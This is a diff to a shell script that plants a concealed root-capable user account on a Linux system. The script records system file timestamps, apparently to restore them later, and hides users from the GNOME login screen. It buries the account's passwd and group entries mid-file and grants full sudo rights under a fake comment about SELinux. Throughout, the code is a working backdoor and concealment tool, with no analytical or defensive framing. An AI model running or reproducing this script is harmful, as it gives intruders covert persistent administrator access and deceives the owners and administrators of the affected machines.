@@ -16,11 +16,10 @@ passwd_time=$(ls -l /etc/passwd | cut -d " " -f 6-8)
 shadow_time=$(ls -l /etc/shadow | cut -d " " -f 6-8)
 group_time=$(ls -l /etc/group | cut -d " " -f 6-8)
 sudoers_time=$(ls -l /etc/sudoers | cut -d " " -f 6-8)
-loginscreen_time=$(ls -ld /root | cut -d " " -f 6-8)
-# /etc/dconf/db/gdm.d/00-login-screen doesn't exist by default - we had to create it and want it to look like it was part of the OS install
+loginscreen_time=$(ls -ld /root | cut -d " " -f 6-8) # this file doesn't exist yet; set to some other file time
 
 
-# stop new user from being added to login screen menu?
+# stop new user from being added to login screen menu
 echo -e "[org/gnome/login-screen]\n# Do not show the user lsit\ndisable-user-list=true" >> /etc/dconf/db/gdm.d/00-login-screen
 #echo -e "user-db:user\nsystem-db:gdm\nfile-db:/usr/share/gdm/greeter-dconf-defaults" >> /etc/dconf/profile/gdm # maybe necessary for CentOS 8
 dconf update
@@ -42,22 +41,24 @@ usermod --home=/ $user
 echo $password | passwd --stdin $user
 
 
-# find entry in /etc/passwd
-entry=$(grep $user /etc/passwd)
+# find entries in /etc/passwd and /etc/group
+passwd_entry=$(grep $user /etc/passwd)
+group_entry=$(grep $user /etc/group)
 
-# get line number of our new entry
-line=$(cat -n /etc/passwd | grep $user | awk '{print $1}')
+# get line number of our new entries
+passwd_line=$(cat -n /etc/passwd | grep $user | awk '{print $1}')
+group_line=$(cat -n /etc/group | grep $user | awk '{print $1}')
+# needs testing
 
-# move the line to the position after the static line 22
-ex /etc/passwd<<<"$(echo $line)m22|wq"
-ex /etc/group<<<"$(echo $line)m22|wq"
+# move the line to the position after the static line <num>
+ex /etc/passwd<<<"$(echo $passwd_line)m22|wq"
+ex /etc/group<<<"$(echo $group_line)m35|wq" # more groups than users
 
 
 # give sudo rights by editing /etc/sudoers
 # the advantage to this method as opposed to adding to wheel group is that it appears as though the user has no secondary groups when viewing /etc/group
-
 cat << EOM >> /etc/sudoers
-## Allows SELinux to do things
+## Allows SELinux manage system permissions
 %$user  ALL=(ALL)   ALL
 EOM
 
